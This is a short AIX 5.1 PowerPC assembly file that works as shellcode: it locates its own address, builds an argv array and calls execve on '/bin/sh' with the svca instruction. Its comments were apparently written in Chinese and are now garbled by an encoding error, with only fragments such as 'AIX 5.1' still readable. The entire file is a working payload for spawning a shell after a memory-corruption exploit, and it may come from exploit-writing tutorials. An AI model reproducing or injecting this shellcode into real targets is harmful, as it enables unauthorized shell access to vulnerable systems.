.globl .main
.csect .text[PR]
.main:
        xor.    %r5, %r5, %r5       # ��r5�Ĵ�����գ�������cr�Ĵ���������ȱ�־
        bnel    .main               # ���û����ȱ�־�ͽ����֧���Ұѷ��ص�ַ����
                                    # ��lr�Ĵ��������ﲻ��������ѭ��
        mflr    %r3                 # �ȼ���mfspr r3, 8����lr�Ĵ�����ֵ������r3��
                                    # ����r3�Ĵ�����ֵ��������ָ��ĵ�ַ
        addi    %r3, %r3, 32        # ��һ��ָ�/bin/sh�ַ�����8��ָ�����r3
                                    # ָ��/bin/sh�ַ�����ʼ�ĵ�ַ
        stw     %r3, -8(%r1)        # argv[0] = string ��r3д���ջ
        stw     %r5, -4(%r1)        # argv[1] = NULL ��0д���ջ
        subi    %r4, %r1, 8         # r4ָ��argv[]
        li      %r2, 5              # AIX 5.1��execve�жϺ���5
        crorc   %cr6, %cr6, %cr6    # ���������������ָ��Ҳ�ܳɹ���lsd��IBM Aix 
                                    # PowerPC Assembler��svcָ����ܶ��ᵽ�ɹ�ִ��
                                    # ϵͳ���õ�ǰ����һ���������ķ�֧��CRָ���
                                    # ��ָ��ȷ����CRָ�
        svca    0                   # execve(r3, r4, r5)
string:                             # execve(path, argv[], NULL)
        .asciz  "/bin/sh"
